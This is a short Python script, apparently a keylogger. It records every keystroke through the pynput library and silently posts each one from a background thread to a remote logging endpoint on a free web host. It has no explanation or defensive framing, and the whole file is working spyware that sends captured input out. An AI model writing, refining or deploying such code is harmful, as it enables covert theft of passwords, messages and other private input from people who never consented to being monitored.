import requests
import threading
from queue import Queue
from pynput import keyboard

url = "https://polandreich.000webhostapp.com/log.php"
queue = Queue()

def send_requests():
    while True:
        key = queue.get()
        try:
            requests.post(url, data={"key": str(key)})
        except:
            pass
        queue.task_done()

sender = threading.Thread(target=send_requests)
sender.daemon = True
sender.start()

def on_press(key):
    queue.put(key)

listener = keyboard.Listener(on_press=on_press)
listener.start()

listener.join()
